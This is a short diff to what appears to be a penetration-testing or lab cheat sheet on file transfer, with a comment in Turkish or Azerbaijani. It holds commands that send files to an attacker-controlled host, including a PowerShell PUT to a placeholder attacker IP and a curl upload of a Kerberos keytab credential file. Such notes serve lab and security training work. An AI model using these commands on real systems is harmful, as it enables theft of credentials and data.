@@ -25,7 +25,7 @@ wget http://LINUX_IP:<PORT>/file.txt
 pip3 install uploadserver
 python3 -m uploadserver 8000
 
-Invoke-WebRequest -Uri "http://YOUR_ATTACKER_IP:8000/hash.txt" -Method PUT -InFile "C:\path\to\file.txt"
+Invoke-WebRequest -Uri "http://YOUR_ATTACKER_IP:8000/upload" -Method PUT -InFile "C:\path\to\file.txt"
 curl -X POST -F "files=@/opt/specialfiles/carlos.keytab"  http://10.10.14.7:8000/upload
 
 # Wildcard (bütün fayllar)
